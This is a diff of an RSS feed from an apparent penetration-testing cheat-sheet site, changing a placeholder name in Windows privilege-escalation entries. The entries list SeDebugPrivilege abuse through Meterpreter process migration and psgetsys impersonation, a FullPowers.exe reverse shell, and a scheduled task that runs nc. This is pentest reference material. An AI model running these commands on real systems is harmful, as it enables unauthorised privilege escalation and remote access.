@@ -12,14 +12,14 @@
       <link>https://tldrbins.github.io/sedebugprivilege/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sedebugprivilege/</guid>
-      <description>Tools Metasploit psgetsys.ps1 # Inside meterpreter ps winlogon # Explorer.exe is a good candidate migrate &amp;lt;PID&amp;gt; # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid &amp;lt;PID&amp;gt; -command &amp;#34;c:\windows\system32\cmd.exe&amp;#34; -cmdargs &amp;#34;/c &amp;lt;powershell #3 Base64&amp;gt;&amp;#34; Ref: psgetsys</description>
+      <description>Tools Metasploit psgetsys.ps1 # Inside meterpreter ps winlogon # Explorer.exe is a good candidate migrate &amp;lt;PID&amp;gt; # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid &amp;lt;PID&amp;gt; -command &amp;#34;c:\windows\system32\cmd.exe&amp;#34; -cmdargs &amp;#34;/c &amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34; Ref: psgetsys</description>
     </item>
     <item>
       <title>SeImpresonate</title>
       <link>https://tldrbins.github.io/seimpresonate/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/seimpresonate/</guid>
-      <description>Abuse #1: Recover SeImpresonate .\FullPowers.exe -c &amp;#34;whoami /priv&amp;#34; # Revshell .\FullPowers.exe -c &amp;#34;&amp;lt;powershell #3 Base64&amp;gt;&amp;#34; Ref: FullPower&#xA;Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = &amp;#34;SeAssignPrimaryTokenPrivilege&amp;#34;, &amp;#34;SeAuditPrivilege&amp;#34;, &amp;#34;SeChangeNotifyPrivilege&amp;#34;, &amp;#34;SeCreateGlobalPrivilege&amp;#34;, &amp;#34;SeImpersonatePrivilege&amp;#34;, &amp;#34;SeIncreaseQuotaPrivilege&amp;#34;, &amp;#34;SeIncreaseWorkingSetPrivilege&amp;#34;, &amp;#34;SeTimeZonePrivilege&amp;#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId &amp;#34;&amp;lt;SERVICE_ACCOUNT&amp;gt;&amp;#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute &amp;#34;powershell.exe&amp;#34; -Argument &amp;#34;-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.</description>
+      <description>Abuse #1: Recover SeImpresonate .\FullPowers.exe -c &amp;#34;whoami /priv&amp;#34; # Revshell .\FullPowers.exe -c &amp;#34;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34; Ref: FullPower&#xA;Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = &amp;#34;SeAssignPrimaryTokenPrivilege&amp;#34;, &amp;#34;SeAuditPrivilege&amp;#34;, &amp;#34;SeChangeNotifyPrivilege&amp;#34;, &amp;#34;SeCreateGlobalPrivilege&amp;#34;, &amp;#34;SeImpersonatePrivilege&amp;#34;, &amp;#34;SeIncreaseQuotaPrivilege&amp;#34;, &amp;#34;SeIncreaseWorkingSetPrivilege&amp;#34;, &amp;#34;SeTimeZonePrivilege&amp;#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId &amp;#34;&amp;lt;SERVICE_ACCOUNT&amp;gt;&amp;#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute &amp;#34;powershell.exe&amp;#34; -Argument &amp;#34;-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.</description>
     </item>
   </channel>
 </rss>
